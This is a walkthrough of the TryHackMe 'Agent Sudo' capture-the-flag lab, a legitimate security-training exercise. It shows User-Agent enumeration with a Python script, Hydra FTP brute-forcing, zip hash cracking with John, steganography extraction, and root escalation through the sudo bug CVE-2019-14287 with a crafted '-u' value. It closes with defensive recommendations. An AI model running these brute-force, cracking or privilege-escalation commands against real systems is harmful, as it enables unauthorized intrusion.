# Try Hack Me - Agent Sudo

**Categories:**  Enumerate, exploit, brute-force, hash cracking  
**Difficulty:** Easy  

Commands used in this guide use the exported variable $IP (`export IP=10.10.14.34`) in place of the target machine's IP address.

## 1: Enumeration - nmap

Having launched the machine, we perform a basic TCP port scan with nmap (`sudo nmap $IP`) followed by a version enumeration scan on the 3 discovered ports (21, 22 and 80) :

```console
┌──(kali㉿kali)-[~/Documents/tthm/agent-sudo]
└─$ sudo nmap $IP -sV -p21,22,80 -oN nmap.out
...snip...
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
...snip...
```

Searchsploit and google give no relevant vulnerabilities for these versions, and no anonymous login is available on 21. Navigating to the application on 80, we find a clue (yes, a clue - this is a very CTFy machine. It's fun!) :

```html
...snip...
<p>
        Dear agents,
        <br><br>
        Use your own <b>codename</b> as user-agent to access the site.
        <br><br>
        From,<br>
        Agent R
</p>
...snip...
```

## 2: User-agent enumeration : python

So presumably we need to modify the User-Agent header, and if all the "agent" codenames follow the format of "Agent R", we can assume that we need to run through codenames A-Z. We could do this in BurpSuite's intruder module, or we could write a simple script to generate the requests : 

```python
from requests import get
from string import ascii_uppercase

IP =  '10.10.14.34'

def report_output(char: str, length: str) -> None:
    print(f'User-Agent : {char}\tResponse length : {length}')

def build_user_agent(char: str) -> dict[str, str]:
    return { 'User-Agent': char }

for char in ascii_uppercase:
    resp = get(f'http://{IP}', headers=build_user_agent(char))
    report_output(char, len(resp.content))
```

Running the script, we find two User-Agents that stand out, C and R :

```console
┌──(kali㉿kali)-[~/Documents/tthm/agent-sudo]
└─$ python3 user-agent-enum.py
User-Agent : A    Response length : 218
User-Agent : B    Response length : 218
User-Agent : C    Response length : 177
...snip...
User-Agent : R    Response length : 310
...snip...
```

curling R with the `-A` flag to modify the User-Agent header reveals more fluff : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/agent-sudo]
└─$ curl -A "R" $IP           
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
<!DocType html>
<html>
<head>
        <title>Annoucement</title>
</head>
...snip...
```

and doing the same with C returns the same initial page : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/agent-sudo]
└─$ curl -A "C" $IP

<!DocType html>
<html>
<head>
        <title>Annoucement</title>
</head>
...snip...
```

So what accounts for the difference in response length with C? Let's try again with the headers (`-I`) :

```console
┌──(kali㉿kali)-[~/Documents/tthm/agent-sudo]
└─$ curl -A "C" -I $IP
HTTP/1.1 302 Found
Date: Sat, 18 Sep 2021 03:26:41 GMT
Server: Apache/2.4.29 (Ubuntu)
Location: agent_C_attention.php
Content-Type: text/html; charset=UTF-8
```
and once again with the `-L` flag to follow the redirection to `agent_C_attention.php` : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/agent-sudo]
└─$ curl -A "C" -L $IP 
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R
```
This gives a probable username "chris", and info that the user's password is weak and likely vulnerable to brute force.

## 3: FTP brute force : hydra

While SSH is the high-value target here, the THM room nudges us toward FTP. We use Hydra to brute-force the chris user's FTP password with the rockyou wordlist :

```console
┌──(kali㉿kali)-[~/Documents/tthm/agent-sudo]
└─$ hydra -l chris -P rockyou $IP ftp
...snip...
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-17 22:25:59
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.14.34:21/
[21][ftp] host: 10.10.14.34   login: chris   password: PASSWORD
```
Connecting with the discovered password, we find three files : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/agent-sudo]
└─$ ftp $IP
Connected to 10.10.14.34.
...snip...
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
```

with the `To_agentJ.txt` file hinting at data "somehow stored" in the image files :

```console
┌──(kali㉿kali)-[~/Documents/tthm/agent-sudo]
└─$ cat To_agentJ.txt  
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

## 4: Steganography, data extraction 1 : binwalk, john

There is some trial and error here analysing the recovered files in various steg tools - for this guide, we'll stick to the happy path. Running binwalk on `cutie.png` reveals an embedded zip archive : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/agent-sudo]
└─$ binwbinwalk cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

It's important to note here that the zlib archive at 0x365 is not a stenographic addition, but rather a feature of [PNG's lossless compression method](https://en.wikipedia.org/wiki/Deflate). The hidden archive is at 0x8702, and can be extracted with binwalk (`binwalk -e cutie.png`) : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/agent-sudo]
└─ls -la _cutie.png.extracted
total 324
drwxr-xr-x 2 kali kali   4096 Sep 18 00:22 .
drwxr-xr-x 4 kali kali   4096 Sep 18 00:23 ..
-rw-r--r-- 1 kali kali 279312 Sep 18 00:22 365
-rw-r--r-- 1 kali kali  33973 Sep 18 00:22 365.zlib
-rw-r--r-- 1 kali kali    280 Sep 18 00:22 8702.zip
-rw-r--r-- 1 kali kali      0 Oct 29  2019 To_agentR.txt
```

Attempting to extract the `8702.zip` archive with 7z requires a password that we don't have. To attempt to crack the password, we extract the hash with zip2john (you'll need the [jumbo version of john](https://github.com/openwall/john) for zip2john) : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/agent-sudo/_cutie.png.extracted]
└─$ zip2john 8702.zip > ../hash.txt && cat ../hash.txt
ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type
8702.zip/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e*61c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0b5e64e*4969f382486cb6767ae6*$/zip2$:To_agentR.txt:8702.zip:8702.zip
```
and keeping things simple, we run john directly on the extracted hash : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/agent-sudo]
└─$ john hash.txt      
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
...snip...
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
PASSWORD            (8702.zip/To_agentR.txt)
1g 0:00:00:00 DONE 2/3 (2021-09-18 00:32) 1.162g/s 51148p/s 51148c/s 51148C/s 123456..Peter
```

We extract the `8702.zip` with 7zip (`7z e 8702.zip`) using the password cracked by john to reveal another hint file `To_agentR.txt` :

```console
┌──(kali㉿kali)-[~/Documents/tthm/agent-sudo/_cutie.png.extracted]
└─$ cat To_agentR.txt
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

Base64 decoding the 'quoted' string gives a possible passphrase or password.

## 5: Steganography, data extraction 2 : steghide

Running steghide on `cute-alien.jpg` fails with an empty passphrase : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/agent-sudo]
└─$ steghide info cute-alien.jpg           
"cute-alien.jpg":
  format: jpeg
  capacity: 1.8 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

but using the passphrase identified at the previous step reveals a hidden file `message.txt` : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/agent-sudo]
└─$ cat message.txt
Hi james,

Glad you find this message. Your login password is PASSWORD!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

Connect to SSH using the discovered credentials. The user flag is at `/home/james/user.txt`.

## 6: Privesc : CVE-2019-14287

Running `sudo -l` as james reveals a slightly unusual sudoers format that might set alarm bells ringing :

```console
james@agent-sudo:~$ sudo -l
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

This `(ALL, !root)` user permissions configuration was responsible for [CVE-2019-14287](https://nvd.nist.gov/vuln/detail/CVE-2019-14287), a privesc bug in sudo <= 1.8.27, allowing a low-privilege user to escalate to root by manipulating the value passed to sudo's `-u` flag. [Certain values passed to the `-u` flag were not appropriately sanitised within sudo when the ALL permission was applied](https://www.sudo.ws/alerts/minus_1_uid.html), resulting in the current user being assigned a UID of 0, or root. To see if this vulnerability applies here, we confirm that the sudo version is <= 1.8.27 : 

```console
james@agent-sudo:~$ sudo -V
Sudo version 1.8.21p2
```

and we pass the crafted user ID from the CVE listing to `sudo -u` :

```console
james@agent-sudo:~$ sudo -u \#$((0xffffffff)) /bin/bash
root@agent-sudo:~# id
uid=0(root) gid=1000(james) groups=1000(james)
```

The root flag is at `/root/root.txt`.

If this feels a bit "you either know it or you don't", remember that version enumeration is a key part effective privesc. Linpeas lists the sudo version for this reason, and `sudo -l` and `sudo -V` should be goto's in your manual version enumeration process (...and the box is called agent-sudo).

## 7. Summary and recommendations

So this is all very CTF-y, but we can still pull out a couple of security lessons : 

* **HTTP headers** Agent R relied on the User-Agent header as a unique identifier. Spoofing HTTP headers is trivial and they should not be used to store sensitive or identifying information. Only Cookies should be considered suitable for authentication / authorisation, and only when properly scoped and managed.
* **Password Complexity** Accessing the zipfile embedded in the `cutie.png` image relied on cracking a password hash. Using a sufficiently complex password (length and randomness is particularly important here) makes dictionary attacks effectively impossible.
* **Version control, upgrades and software auditing** [The CVE-2019-14287 bug was first announced publicly on the 14th October 2019](https://seclists.org/bugtraq/2019/Oct/21), shortly after the publication of the fixed version. Regular system updates would have eliminated this vulnerability, but for other binaries and applications threat information and version updates are less readily available. Proactive vulnerability scanning, version control and auditing, and effective threat intelligence integration are key here - know what you've got, know what version you have, and find out who will tell you about it when something goes wrong.